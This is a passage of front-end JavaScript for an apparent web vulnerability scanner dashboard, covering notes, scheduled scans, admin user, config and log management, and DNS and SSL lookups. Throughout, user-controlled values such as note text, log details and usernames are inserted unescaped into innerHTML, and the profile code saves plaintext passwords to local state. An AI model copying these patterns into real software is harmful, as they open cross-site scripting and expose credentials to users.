    el.innerHTML = `<div style="color:var(--red);font-size:12.5px;padding:8px 0">Hash generation failed: ${e.message}</div>`;
    toast('Hash error: ' + e.message, 'error');
  }
}

// ==================== NOTES ====================
function renderNotes() {
  const el = document.getElementById('notes-list');
  if (!state.notes.length) { el.innerHTML = `<div class="empty"><div class="em-ico">📝</div><div class="em-h">No notes yet</div><div class="em-p">Keep track of findings, payloads, and observations</div><button class="btn btn-p" onclick="openNoteModal()">+ Add Note</button></div>`; return; }
  el.innerHTML = [...state.notes].sort((a, b) => b.ts - a.ts).map(n => `
    <div class="note-card">
      <div class="note-ttl">${n.title}</div>
      <div class="note-body">${n.body}</div>
      <div class="note-ft">
        <div style="display:flex;gap:6px;align-items:center">
          ${n.tag ? `<span class="badge bi">${n.tag}</span>` : ''}
          <span class="note-date">${fmtDate(n.ts)}</span>
        </div>
        <button class="btn btn-d btn-xs" onclick="deleteNote('${n.id}')">🗑 Delete</button>
      </div>
    </div>`).join('');
}

function openNoteModal() { document.getElementById('note-modal').style.display = 'flex'; document.getElementById('note-title').value = ''; document.getElementById('note-body').value = ''; document.getElementById('note-tag').value = ''; }
function closeNoteModal() { document.getElementById('note-modal').style.display = 'none'; }

function saveNote() {
  const title = document.getElementById('note-title').value.trim();
  const body = document.getElementById('note-body').value.trim();
  if (!title || !body) { toast('Title and content are required', 'error'); return; }
  state.notes.push({ id: 'n' + Date.now(), title, body, tag: document.getElementById('note-tag').value.trim(), ts: Date.now() });
  save(); closeNoteModal(); renderNotes(); toast('Note saved!', 'success');
}

function deleteNote(id) {
  state.notes = state.notes.filter(n => n.id !== id);
  save(); renderNotes(); toast('Note deleted', 'info');
}

// ==================== ADD TARGET MODAL ====================
function openAddTarget() { document.getElementById('at-modal').style.display = 'flex'; }
function closeAddTarget() { document.getElementById('at-modal').style.display = 'none'; }
function saveTarget() {
  const name = document.getElementById('at-name').value.trim();
  const url = document.getElementById('at-url').value.trim();
  if (!name || !url) { toast('Name and URL are required', 'error'); return; }
  document.getElementById('surl').value = url;
  closeAddTarget();
  nav('scanner');
  toast('Target loaded into scanner', 'success');
}

// ==================== SCHEDULES CONTROLLER ====================
function onSchedIntervalChange() {
  const val = document.getElementById('sched-interval').value;
  document.getElementById('sched-cron-container').style.display = val === 'custom' ? 'block' : 'none';
}

function openScheduleModal() {
  const url = document.getElementById('surl').value.trim();
  if (!url) { toast('Please enter a Target URL first', 'error'); return; }
  document.getElementById('sched-url').value = url;
  document.getElementById('sched-interval').value = '0 0 * * *';
  document.getElementById('sched-cron').value = '0 0 * * *';
  document.getElementById('sched-cron-container').style.display = 'none';
  document.getElementById('schedule-modal').style.display = 'flex';
  focusTrap(document.getElementById('schedule-modal'));
}

function closeScheduleModal() {
  removeFocusTrap(document.getElementById('schedule-modal'));
  document.getElementById('schedule-modal').style.display = 'none';
}

async function saveSchedule() {
  const url = document.getElementById('sched-url').value.trim();
  let cron = document.getElementById('sched-interval').value;
  if (cron === 'custom') {
    cron = document.getElementById('sched-cron').value.trim();
  }
  if (!cron) { toast('Please specify a cron expression', 'error'); return; }

  try {
    let projectId = '';
    const projSel = document.getElementById('scan-project-sel');
    if (projSel && projSel.value) {
      projectId = projSel.value;
    } else {
      const pResp = await apiFetch(`${API_BASE}/api/projects`, {
        method: 'POST',
        body: JSON.stringify({ name: `Quick Project — ${new URL(url).hostname}`, description: 'Created for schedule' })
      });
      if (!pResp.ok) { toast('Failed to create project', 'error'); return; }
      const pData = await pResp.json();
      projectId = pData.id;
    }

    const tResp = await apiFetch(`${API_BASE}/api/targets`, {
      method: 'POST',
      body: JSON.stringify({ url, name: new URL(url).hostname, project_id: projectId })
    });
    if (!tResp.ok) { toast('Failed to create target', 'error'); return; }
    const target = await tResp.json();

    const sResp = await apiFetch(`${API_BASE}/api/schedules`, {
      method: 'POST',
      body: JSON.stringify({ target_id: target.id, cron_expression: cron })
    });
    if (sResp.ok) {
      toast('Schedule saved successfully', 'success');
      closeScheduleModal();
      loadSchedules();
    } else {
      const err = await sResp.json();
      toast('Failed to save schedule: ' + (err.error || 'unknown'), 'error');
    }
  } catch (e) {
    toast('Connection error while saving schedule', 'error');
  }
}

async function loadSchedules() {
  const list = document.getElementById('schedules-list');
  if (!list) return;
  list.innerHTML = '<div class="ph"><span class="spin"></span> Loading schedules...</div>';
  try {
    const resp = await apiFetch(`${API_BASE}/api/schedules`);
    if (!resp.ok) { list.innerHTML = '<div class="ph" style="color:var(--red)">Failed to load schedules</div>'; return; }
    const data = await resp.json();
    if (!data || !data.length) {
      list.innerHTML = '<div class="ph">No active scheduled scans.</div>';
      return;
    }
    list.innerHTML = data.map(s => `
          <div style="display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid rgba(255,255,255,.04)">
            <div>
              <div style="font-weight:600;font-family:var(--mono);word-break:break-all">${s.target_url}</div>
              <div style="font-size:10.5px;color:var(--text3);margin-top:2px">📅 Cron: <strong style="color:var(--text2)">${s.cron_expression}</strong> &nbsp;·&nbsp; Last run: ${s.last_run ? fmtDate(Date.parse(s.last_run)) : 'never'}</div>
            </div>
            <button class="btn btn-d btn-xs" onclick="deleteSchedule('${s.id}')">✕</button>
          </div>
        `).join('');
  } catch (e) {
    list.innerHTML = '<div class="ph" style="color:var(--red)">Connection error.</div>';
  }
}

async function deleteSchedule(id) {
  if (!confirm('Are you sure you want to delete this schedule?')) return;
  try {
    const resp = await apiFetch(`${API_BASE}/api/schedules/${id}`, { method: 'DELETE' });
    if (resp.ok) {
      toast('Schedule deleted', 'info');
      loadSchedules();
    } else {
      toast('Failed to delete schedule', 'error');
    }
  } catch (e) {
    toast('Connection error', 'error');
  }
}


// ==================== ADMIN PANEL CONTROLLER ====================
async function renderAdmin() {
  _adminSessionExpiredHandled = false;
  await Promise.all([
    fetchAdminUsers(),
    fetchAdminConfig(),
    fetchAdminLogs()
  ]);

  if (!adminLogInterval) {
    adminLogInterval = setInterval(fetchAdminLogs, 5000);
  }
}

// ===== Admin API helpers: give clear feedback instead of failing silently =====
let _adminSessionExpiredHandled = false;

function setBtnLoading(btn, loading) {
  if (!btn || !btn.tagName) return;
  if (loading) {
    if (btn._origHtml === undefined) btn._origHtml = btn.innerHTML;
    btn.disabled = true;
    btn.innerHTML = '⏳ Loading…';
  } else {
    btn.disabled = false;
    if (btn._origHtml !== undefined) { btn.innerHTML = btn._origHtml; btn._origHtml = undefined; }
  }
}

// Performs an authenticated admin GET; throws a tagged error on any failure.
async function adminApiGet(path, options) {
  const token = localStorage.getItem('vs_token');
  if (!token) { const e = new Error('No active session'); e.code = 'NO_TOKEN'; throw e; }
  let resp;
  try {
    resp = await fetch(`${API_BASE}${path}`, Object.assign({
      headers: { 'Authorization': `Bearer ${token}` }
    }, options || {}));
  } catch (netErr) {
    const e = new Error('Backend unreachable'); e.code = 'OFFLINE'; throw e;
  }
  if (!resp.ok) {
    let body = null;
    try { body = await resp.json(); } catch (_) { }
    const e = new Error((body && body.error) || ('HTTP ' + resp.status));
    e.code = 'HTTP'; e.status = resp.status; e.body = body;
    throw e;
  }
  return resp.json();
}

// Maps a tagged error to a friendly message; fires toast (unless silent) and
// forces re-login once on 401. Returns the message for inline rendering.
function adminApiError(err, opts) {
  opts = opts || {};
  let msg;
  if (err.code === 'NO_TOKEN') {
    msg = 'No active server session — you appear to be in offline mode. Sign in again with the backend running to manage the system.';
  } else if (err.code === 'OFFLINE') {
    msg = 'Cannot reach the backend server (' + API_BASE + '). Make sure backend_app.py is running, then retry.';
  } else if (err.code === 'HTTP' && err.status === 401) {
    msg = 'Your session has expired. Please sign in again.';
    if (!_adminSessionExpiredHandled) {
      _adminSessionExpiredHandled = true;
      if (!opts.silent) toast(msg, 'error');
      setTimeout(doLogout, 1200);
    }
    return msg;
  } else if (err.code === 'HTTP' && err.status === 403) {
    msg = 'Access denied: administrator privileges are required.';
  } else {
    msg = err.message || 'Unexpected error while loading data.';
  }
  if (!opts.silent) toast(msg, 'error');
  return msg;
}

function adminTableError(msg, retryFn) {
  return `<tr><td colspan="5" style="text-align:center;padding:30px 14px;color:var(--text2)">
        <div style="font-size:26px;margin-bottom:8px">⚠️</div>
        <div style="max-width:440px;margin:0 auto 12px;line-height:1.5">${msg}</div>
        <button class="btn btn-g btn-sm" onclick="${retryFn}(this)">🔄 Retry</button>
      </td></tr>`;
}

function adminBoxError(msg, retryFn) {
  return `<div style="text-align:center;padding:24px 14px;color:var(--text2)">
        <div style="font-size:24px;margin-bottom:8px">⚠️</div>
        <div style="max-width:440px;margin:0 auto 12px;line-height:1.5">${msg}</div>
        <button class="btn btn-g btn-sm" onclick="${retryFn}(this)">🔄 Retry</button>
      </div>`;
}

// ---- Loading skeletons (shimmer placeholders while admin data loads) ----
function adminUsersSkeleton() {
  let rows = '';
  for (let i = 0; i < 5; i++) {
    rows += `<tr>
          <td><div style="display:flex;align-items:center;gap:8px"><div class="skel" style="width:28px;height:28px;border-radius:50%"></div><div style="flex:1"><div class="skel skel-line" style="width:96px;margin-bottom:6px"></div><div class="skel skel-line sm" style="margin-bottom:0"></div></div></div></td>
          <td><div class="skel skel-line md" style="margin-bottom:0"></div></td>
          <td><div class="skel skel-line" style="width:72px;margin-bottom:0"></div></td>
          <td><div class="skel" style="width:38px;height:20px;border-radius:12px"></div></td>
          <td style="text-align:right"><div class="skel skel-line" style="width:64px;margin:0 0 0 auto"></div></td>
        </tr>`;
  }
  return rows;
}

function adminConfigSkeleton() {
  let r = '';
  for (let i = 0; i < 5; i++) {
    r += `<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px"><div class="skel skel-line md" style="margin:0"></div><div class="skel skel-line" style="width:90px;margin:0"></div></div>`;
  }
  return r;
}

function adminLogsSkeleton() {
  let r = '';
  for (let i = 0; i < 4; i++) {
    r += `<div style="padding:8px;border-bottom:1px solid rgba(255,255,255,.04)"><div class="skel skel-line sm" style="margin-bottom:6px"></div><div class="skel skel-line lg" style="margin-bottom:0"></div></div>`;
  }
  return r;
}

async function fetchAdminUsers(btn) {
  setBtnLoading(btn, true);
  const _ul = document.getElementById('admin-users-list');
  if (_ul) _ul.innerHTML = adminUsersSkeleton();
  try {
    const users = await adminApiGet('/api/admin/users');

    // Keep local state.users in sync with backend
    state.users = users.map(u => ({
      username: u.username,
      name: u.display_name || u.username,
      email: u.email,
      role: u.role,
      is_active: u.is_active,
      email_verified: u.email_verified
    }));
    save();

    const list = document.getElementById('admin-users-list');
    if (!list) return;

    list.innerHTML = users.map(u => {
      const isMe = state.user && state.user.username === u.username;
      return `<tr>
            <td>
              <div style="display: flex; align-items: center; gap: 8px;">
                <div class="ua" style="width: 28px; height: 28px; font-size: 12px; margin: 0; background: ${u.role === 'admin' ? 'var(--grad)' : 'rgba(255,255,255,0.06)'}; color: #fff;">
                   ${(u.display_name || u.username).charAt(0).toUpperCase()}
                </div>
                <div>
                  <div style="font-weight: 600; color: var(--text);">${u.display_name || u.username} ${isMe ? '<span style="color:var(--cyan); font-size:10px;">(You)</span>' : ''}</div>
                  <div style="font-size: 11px; color: var(--text3);">@${u.username}</div>
                </div>
              </div>
            </td>
            <td style="color: var(--text2); vertical-align: middle;">
              <div style="display: flex; align-items: center; gap: 6px;">
                <span>${u.email}</span>
                ${u.email_verified ?
          '<span class="badge" style="background:rgba(45,212,191,0.1); color:var(--green); border:1px solid rgba(45,212,191,0.2); font-size:9.5px; padding:1px 5px; border-radius:4px; font-weight:600;">Verified</span>' :
          '<span class="badge" style="background:rgba(251,94,126,0.1); color:var(--red); border:1px solid rgba(251,94,126,0.2); font-size:9.5px; padding:1px 5px; border-radius:4px; font-weight:600;">Unverified</span>'
        }
              </div>
            </td>
            <td style="vertical-align: middle;">
              <select class="fi" style="padding: 4px 8px; font-size: 11.5px; width: auto; min-width: 85px;" 
                      onchange="updateUserRole('${u.id}', this.value)" 
                      ${u.username === 'admin' ? 'disabled' : ''}>
                <option value="user" ${u.role === 'user' ? 'selected' : ''}>User</option>
                <option value="admin" ${u.role === 'admin' ? 'selected' : ''}>Admin</option>
              </select>
            </td>
            <td style="vertical-align: middle;">
              <div class="tog ${u.is_active ? 'on' : ''} ${u.username === 'admin' ? 'disabled' : ''}" 
                   style="${u.username === 'admin' ? 'pointer-events: none; opacity: 0.5;' : ''}" 
                   onclick="toggleUserActive('${u.id}', this)">
              </div>
            </td>
            <td style="text-align: right; vertical-align: middle;">
              <button class="btn btn-d btn-sm" 
                      onclick="deleteUser('${u.id}', '${u.username}')" 
                      ${u.username === 'admin' ? 'disabled' : ''}>🗑️ Delete</button>
            </td>
          </tr>`;
    }).join('');
  } catch (e) {
    const list = document.getElementById('admin-users-list');
    if (list) list.innerHTML = adminTableError(adminApiError(e, { silent: !btn }), 'fetchAdminUsers');
  } finally {
    setBtnLoading(btn, false);
  }
}

let cachedAdminLogs = [];
let activeLogFilter = 'all';
let _lastLogsSig = '';

async function fetchAdminConfig(btn) {
  setBtnLoading(btn, true);
  const _cl = document.getElementById('admin-config-list');
  if (_cl) _cl.innerHTML = adminConfigSkeleton();
  try {
    const config = await adminApiGet('/api/admin/config');

    const container = document.getElementById('admin-config-list');
    if (!container) return;

    container.innerHTML = `
          <div style="display: flex; flex-direction: column; gap: 8px;">
            <div style="display: flex; justify-content: space-between; align-items: center;">
              <span style="color: var(--text2);">Rate Limit Max Attempts</span>
              <input type="number" class="fi" id="cfg-rl-max" style="width: 100px; padding: 4px 8px; text-align: right;" value="${config.LOGIN_RL_MAX}">
            </div>
            <div style="display: flex; justify-content: space-between; align-items: center;">
              <span style="color: var(--text2);">Rate Limit Window (seconds)</span>
              <input type="number" class="fi" id="cfg-rl-window" style="width: 100px; padding: 4px 8px; text-align: right;" value="${config.LOGIN_RL_WINDOW_SEC}">
            </div>
            <div style="display: flex; justify-content: space-between; align-items: center;">
              <span style="color: var(--text2);">Lockout Threshold (failures)</span>
              <input type="number" class="fi" id="cfg-lock-threshold" style="width: 100px; padding: 4px 8px; text-align: right;" value="${config.LOGIN_LOCK_THRESHOLD}">
            </div>
            <div style="display: flex; justify-content: space-between; align-items: center;">
              <span style="color: var(--text2);">Lockout Duration (seconds)</span>
              <input type="number" class="fi" id="cfg-lock-duration" style="width: 100px; padding: 4px 8px; text-align: right;" value="${config.LOGIN_LOCK_DURATION_SEC}">
            </div>
            <div style="display: flex; justify-content: space-between; align-items: center; border-top: 1px solid rgba(255,255,255,0.04); padding-top: 8px; margin-top: 4px;">
              <span style="color: var(--text2);">SMTP Notification Status</span>
              <span style="font-weight: 700; color: ${config.SMTP_CONFIGURED ? 'var(--green)' : 'var(--red)'};" id="cfg-smtp-status">
                ${config.SMTP_CONFIGURED ? '✅ Active (' + config.SMTP_HOST + ')' : '❌ Unconfigured'}
              </span>
            </div>
            <div style="display: flex; justify-content: space-between; align-items: center;">
              <span style="color: var(--text2);">Application Base URL</span>
              <span style="font-family: var(--mono); color: var(--text3); font-size: 11.5px;">${config.APP_BASE_URL}</span>
            </div>
          </div>
        `;
  } catch (e) {
    const c = document.getElementById('admin-config-list');
    if (c) c.innerHTML = adminBoxError(adminApiError(e, { silent: !btn }), 'fetchAdminConfig');
  } finally {
    setBtnLoading(btn, false);
  }
}

async function saveAdminConfig() {
  const token = localStorage.getItem('vs_token');
  if (!token) return;

  const rlMax = document.getElementById('cfg-rl-max').value;
  const rlWindow = document.getElementById('cfg-rl-window').value;
  const lockThreshold = document.getElementById('cfg-lock-threshold').value;
  const lockDuration = document.getElementById('cfg-lock-duration').value;

  try {
    const resp = await fetch(`${API_BASE}/api/admin/config`, {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${token}`
      },
      body: JSON.stringify({
        LOGIN_RL_MAX: parseInt(rlMax),
        LOGIN_RL_WINDOW_SEC: parseInt(rlWindow),
        LOGIN_LOCK_THRESHOLD: parseInt(lockThreshold),
        LOGIN_LOCK_DURATION_SEC: parseInt(lockDuration)
      })
    });

    if (resp.ok) {
      toast('Configurations updated successfully', 'success');
      fetchAdminConfig();
      fetchAdminLogs();
    } else {
      const err = await resp.json();
      toast(err.error || 'Failed to update configurations', 'error');
    }
  } catch (e) {
    console.error("Save config error:", e);
    toast('Connection error', 'error');
  }
}

async function fetchAdminLogs(btn) {
  setBtnLoading(btn, true);
  const _ll = document.getElementById('admin-logs-list');
  // Only show shimmer on first load or a manual refresh — not on the 5s auto-refresh.
  if (_ll && (btn || !cachedAdminLogs.length)) _ll.innerHTML = adminLogsSkeleton();
  try {
    const newLogs = await adminApiGet('/api/admin/logs');
    cachedAdminLogs = newLogs;
    // Skip the DOM rebuild on the 5s auto-poll when nothing changed — rebuilding
    // ~100 log rows every 5s is a periodic scroll hitch. Manual refresh always renders.
    const sig = newLogs.length + ':' + (newLogs[0] ? (newLogs[0].id || newLogs[0].timestamp) : '');
    if (btn || sig !== _lastLogsSig) {
      _lastLogsSig = sig;
      renderLogsList(applyLogFilter(cachedAdminLogs));
    }
  } catch (e) {
    const ll = document.getElementById('admin-logs-list');
    if (ll) ll.innerHTML = adminBoxError(adminApiError(e, { silent: !btn }), 'fetchAdminLogs');
  } finally {
    setBtnLoading(btn, false);
  }
}

function applyLogFilter(logs) {
  if (activeLogFilter === 'all') return logs;

  return logs.filter(l => {
    if (activeLogFilter === 'logins') {
      return l.event_type === 'login_success' || l.event_type === 'login_fail' || l.event_type === 'lockout';
    }
    if (activeLogFilter === 'sec') {
      return l.event_type === 'rate_limit' || l.event_type === 'config_update' || l.event_type === 'validation_fail';
    }
    if (activeLogFilter === 'scans') {
      return l.event_type === 'scan_start' || l.event_type === 'vuln_found' || l.event_type === 'vuln_discovered';
    }
    return true;
  });
}

function filterAdminLogs(filterType) {
  activeLogFilter = filterType;

  document.querySelectorAll('[id^="log-filter-"]').forEach(btn => btn.classList.remove('on'));
  const activeBtn = document.getElementById(`log-filter-${filterType}`);
  if (activeBtn) activeBtn.classList.add('on');

  renderLogsList(applyLogFilter(cachedAdminLogs));
}

function openAdminCreateUserModal() {
  clearErrors('admin-create-user-form');
  document.getElementById('ac-username').value = '';
  document.getElementById('ac-name').value = '';
  document.getElementById('ac-email').value = '';
  document.getElementById('ac-password').value = '';
  document.getElementById('admin-create-user-modal').style.display = 'flex';
}

function closeAdminCreateUserModal() {
  document.getElementById('admin-create-user-modal').style.display = 'none';
}

async function saveAdminCreateUser() {
  clearErrors('admin-create-user-form');

  const u = document.getElementById('ac-username').value.trim();
  const name = document.getElementById('ac-name').value.trim();
  const email = document.getElementById('ac-email').value.trim();
  const p = document.getElementById('ac-password').value;

  let clientValid = true;
  if (!u || u.length < 3) { showFieldError('ac-username', 'Username must be 3+ characters'); clientValid = false; }
  if (!email) { showFieldError('ac-email', 'Email is required'); clientValid = false; }
  if (!p) { showFieldError('ac-password', 'Password is required'); clientValid = false; }
  if (!clientValid) { toast('Please correct the validation errors', 'error'); return; }

  try {
    const resp = await fetch(`${API_BASE}/api/auth/register`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: u, email: email, password: p, display_name: name || null })
    });

    const data = await resp.json();

    if (resp.ok) {
      toast(`User account @${u} created successfully!`, 'success');
      closeAdminCreateUserModal();
      fetchAdminUsers();
      fetchAdminLogs();
    } else {
      const errMsg = data.error || 'Failed to create user';
      if (resp.status === 400 && errMsg.includes('Validation failed')) {
        if (data.details) {
          data.details.forEach(err => {
            const parts = err.split(':');
            const f = parts[0].trim();
            const m = parts.slice(1).join(':').trim();
            const map = { 'display_name': 'ac-name', 'email': 'ac-email', 'username': 'ac-username', 'password': 'ac-password' };
            const fieldId = map[f];
            if (fieldId) {
              showFieldError(fieldId, m);
            }
          });
        }
      } else {
        toast(errMsg, 'error');
      }
    }
  } catch (err) {
    console.error("Create user error:", err);
    toast('Connection error', 'error');
  }
}

function getEventBadge(type) {
  let color = 'var(--text2)';
  let bg = 'rgba(255,255,255,0.06)';
  let label = type.toUpperCase();

  switch (type) {
    case 'login_success':
    case 'user_created':
    case 'project_create':
    case 'target_create':
      color = 'var(--green)';
      bg = 'rgba(45, 212, 191, 0.15)';
      break;
    case 'login_fail':
    case 'validation_fail':
    case 'vuln_found':
    case 'vuln_discovered':
      color = 'var(--orange)';
      bg = 'rgba(251, 146, 60, 0.15)';
      break;
    case 'rate_limit':
    case 'lockout':
    case 'user_delete':
    case 'project_delete':
    case 'target_delete':
      color = 'var(--red)';
      bg = 'rgba(251, 94, 126, 0.15)';
      break;
    case 'user_update':
    case 'config_update':
    case 'scan_start':
      color = 'var(--blue)';
      bg = 'rgba(99, 102, 241, 0.15)';
      break;
  }
  return `<span style="color: ${color}; background: ${bg}; padding: 2px 6px; border-radius: 4px; font-weight: 700; font-size: 10px; display: inline-block; border: 1px solid ${color}33;">${label}</span>`;
}

function renderLogsList(logs) {
  const container = document.getElementById('admin-logs-list');
  if (!container) return;
  if (!logs || logs.length === 0) {
    container.innerHTML = `<div style="color: var(--text3); text-align: center; padding: 20px;">No security logs recorded yet.</div>`;
    return;
  }
  container.innerHTML = logs.map(l => {
    const timeStr = new Date(l.timestamp).toLocaleTimeString();
    const dateStr = new Date(l.timestamp).toLocaleDateString();
    return `<div style="padding: 8px; border-bottom: 1px solid rgba(255,255,255,0.04); display: flex; flex-direction: column; gap: 4px;">
          <div style="display: flex; justify-content: space-between; align-items: center; gap: 8px;">
            <span style="color: var(--text3); font-size: 10px;">${dateStr} ${timeStr}</span>
            <span style="color: var(--cyan); font-size: 10.5px; font-weight: 600;">${l.ip_address || 'unknown'}</span>
          </div>
          <div style="display: flex; align-items: center; gap: 6px; flex-wrap: wrap;">
            ${getEventBadge(l.event_type)}
            ${l.username ? `<span style="color: var(--text); font-weight: 600;">@${l.username}</span>` : ''}
          </div>
          <div style="color: var(--text2); font-size: 11px; margin-top: 2px; word-break: break-all;">${l.details || ''}</div>
        </div>`;
  }).join('');
}

async function toggleUserActive(userId, togEl) {
  const token = localStorage.getItem('vs_token');
  if (!token) return;

  const isCurrentlyActive = togEl.classList.contains('on');
  const newStatus = !isCurrentlyActive;

  try {
    const resp = await fetch(`${API_BASE}/api/admin/users/${userId}`, {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${token}`
      },
      body: JSON.stringify({ is_active: newStatus })
    });

    if (resp.ok) {
      const updatedUser = await resp.json();
      togEl.classList.toggle('on', updatedUser.is_active);
      toast('User status updated successfully', 'success');

      // Keep local state.users in sync
      const idx = state.users.findIndex(x => x.username === updatedUser.username);
      if (idx >= 0) {
        state.users[idx].is_active = updatedUser.is_active;
        save();
      }
      fetchAdminLogs();
    } else {
      const err = await resp.json();
      toast(err.error || 'Failed to update user', 'error');
    }
  } catch (e) {
    console.error("Update user status error:", e);
    toast('Connection error', 'error');
  }
}

async function updateUserRole(userId, newRole) {
  const token = localStorage.getItem('vs_token');
  if (!token) return;

  try {
    const resp = await fetch(`${API_BASE}/api/admin/users/${userId}`, {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${token}`
      },
      body: JSON.stringify({ role: newRole })
    });

    if (resp.ok) {
      const updatedUser = await resp.json();
      toast('User role updated successfully', 'success');

      // Keep local state.users in sync
      const idx = state.users.findIndex(x => x.username === updatedUser.username);
      if (idx >= 0) {
        state.users[idx].role = updatedUser.role;
        save();
      }
      fetchAdminLogs();
    } else {
      const err = await resp.json();
      toast(err.error || 'Failed to update user role', 'error');
    }
  } catch (e) {
    console.error("Update user role error:", e);
    toast('Connection error', 'error');
  }
}

async function deleteUser(userId, username) {
  if (!confirm(`Are you sure you want to permanently delete user @${username}? This action cannot be undone.`)) {
    return;
  }

  const token = localStorage.getItem('vs_token');
  if (!token) return;

  try {
    const resp = await fetch(`${API_BASE}/api/admin/users/${userId}`, {
      method: 'DELETE',
      headers: { 'Authorization': `Bearer ${token}` }
    });

    if (resp.ok) {
      toast(`User @${username} deleted successfully`, 'success');

      // Keep local state.users in sync
      state.users = state.users.filter(x => x.username !== username);
      save();

      fetchAdminUsers();
      fetchAdminLogs();
    } else {
      const err = await resp.json();
      toast(err.error || 'Failed to delete user', 'error');
    }
  } catch (e) {
    console.error("Delete user error:", e);
    toast('Connection error', 'error');
  }
}

// ==================== CLOSE MODALS ON OVERLAY ====================
document.querySelectorAll('.mover').forEach(m => {
  m.addEventListener('click', e => { if (e.target === m) m.style.display = 'none'; });
});

// ==================== PROFILE MODAL ====================
function openProfileModal() {
  const u = state.user;
  if (!u) return;
  document.getElementById('pm-avatar').textContent = (u.name || u.username).charAt(0).toUpperCase();
  document.getElementById('pm-name').textContent = u.name || u.username;
  document.getElementById('pm-role').textContent = u.role === 'admin' ? 'Administrator' : 'User';
  document.getElementById('pm-email').textContent = u.email || 'No email set';
  document.getElementById('pm-name-input').value = u.name || u.username;
  document.getElementById('pm-email-input').value = u.email || '';
  document.getElementById('pm-pw-input').value = '';
  document.getElementById('pm-pw2-input').value = '';
  document.getElementById('profile-modal').style.display = 'flex';
}
function closeProfileModal() { document.getElementById('profile-modal').style.display = 'none'; }

function saveProfile() {
  const name = document.getElementById('pm-name-input').value.trim();
  const email = document.getElementById('pm-email-input').value.trim();
  const pw = document.getElementById('pm-pw-input').value;
  const pw2 = document.getElementById('pm-pw2-input').value;
  if (!name) { toast('Name cannot be empty', 'error'); return; }
  if (pw && pw !== pw2) { toast('Passwords do not match', 'error'); return; }
  const idx = state.users.findIndex(u => u.username === state.user.username);
  if (idx >= 0) {
    state.users[idx].name = name;
    state.users[idx].email = email;
    if (pw) state.users[idx].password = pw;
    state.user = state.users[idx];
  }
  const initial = name.charAt(0).toUpperCase();
  document.getElementById('ua').textContent = initial;
  document.getElementById('ta').textContent = initial;
  document.getElementById('un').textContent = name;
  document.getElementById('pm-avatar').textContent = initial;
  document.getElementById('pm-name').textContent = name;
  document.getElementById('pm-email').textContent = email || 'No email set';
  save();
  closeProfileModal();
  toast('Profile updated!', 'success');
}

// ==================== DNS LOOKUP ====================
async function dnsLookup() {
  const domain = document.getElementById('dns-input').value.trim();
  const type = document.getElementById('dns-type').value;
  if (!domain) { toast('Enter a domain name', 'error'); return; }
  const el = document.getElementById('dns-result');
  el.classList.add('show');
  el.innerHTML = '<div class="ph"><span class="spin"></span> Resolving DNS…</div>';
  try {
    const dnsCtrl = new AbortController();
    const dnsTimer = setTimeout(() => dnsCtrl.abort(), 8000);
    const res = await fetch(`https://cloudflare-dns.com/dns-query?name=${encodeURIComponent(domain)}&type=${type}`, {
      headers: { 'Accept': 'application/dns-json' },
      signal: dnsCtrl.signal
    });
    clearTimeout(dnsTimer);
    const data = await res.json();
    const answers = data.Answer || [];
    const authority = data.Authority || [];
    const allRecs = answers.length ? answers : authority;
    if (!allRecs.length) {
      const statusMsg = { 0: 'No records found', 1: 'Format Error', 2: 'Server Failure', 3: 'NXDOMAIN — domain not found', 4: 'Not Implemented', 5: 'Query Refused' };
      el.innerHTML = `<div style="padding:10px;background:rgba(234,179,8,.07);border:1px solid rgba(234,179,8,.2);border-radius:8px;margin-top:8px;font-size:12.5px">
        <div style="color:var(--yellow);font-weight:700">⚠️ No ${type} records found for ${domain}</div>
        <div style="color:var(--text3);font-size:11.5px;margin-top:4px">Status: ${statusMsg[data.Status] || 'Unknown (' + data.Status + ')'}</div>
      </div>`;
      return;
    }
    const typeNames = { 1: 'A', 2: 'NS', 5: 'CNAME', 6: 'SOA', 12: 'PTR', 15: 'MX', 16: 'TXT', 28: 'AAAA', 33: 'SRV', 257: 'CAA' };
    el.innerHTML = `<div style="padding:12px;background:rgba(255,255,255,.04);border-radius:10px;margin-top:8px;border:1px solid var(--border)">
      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;padding-bottom:8px;border-bottom:1px solid var(--border)">
        <div style="font-size:11px;font-weight:800;text-transform:uppercase;letter-spacing:.06em;color:var(--text3)">${type} · ${domain}</div>
        <span style="font-size:11px;color:var(--cyan);font-weight:700">${allRecs.length} record${allRecs.length !== 1 ? 's' : ''}</span>
      </div>
      ${allRecs.map((a, i) => `
        <div style="padding:6px 0;${i < allRecs.length - 1 ? 'border-bottom:1px solid rgba(255,255,255,.05)' : ''}">
          <div style="display:flex;justify-content:space-between;gap:10px;align-items:flex-start">
            <div style="flex-shrink:0">
              <span style="font-size:10px;background:rgba(34,211,238,.1);color:var(--cyan);padding:1px 7px;border-radius:4px;font-weight:700">${typeNames[a.type] || 'TYPE' + a.type}</span>
            </div>
            <div style="font-family:var(--mono);color:var(--text);font-size:12px;word-break:break-all;flex:1;text-align:right">${a.data}</div>
          </div>
          <div style="font-size:10px;color:var(--text3);margin-top:2px;text-align:right">TTL ${a.TTL}s · ${a.name}</div>
        </div>`).join('')}
      ${authority.length && answers.length ? `<div style="margin-top:8px;padding-top:8px;border-top:1px solid var(--border);font-size:11px;color:var(--text3)">+ ${authority.length} authority record(s)</div>` : ''}
    </div>`;
  } catch (e) {
    el.innerHTML = `<div class="ph" style="color:var(--red)">DNS lookup failed — ${e.message}</div>`;
  }
}

// ==================== SSL CHECKER ====================
async function sslCheck() {
  const raw = document.getElementById('ssl-input').value.trim();
  const domain = raw.replace(/^https?:\/\//, '').split('/')[0].split(':')[0];
  if (!domain) { toast('Enter a domain name', 'error'); return; }
  const el = document.getElementById('ssl-result');
  el.classList.add('show');
  el.innerHTML = '<div class="ph"><span class="spin"></span> Querying certificate data…</div>';
  try {
    // Use Certspotter API (sslmate) — supports CORS from browsers
    const res = await fetch(`https://api.certspotter.com/v1/issuances?domain=${encodeURIComponent(domain)}&include_subdomains=true&expand=dns_names&expand=issuer&expand=cert`);
    if (res.status === 429) {
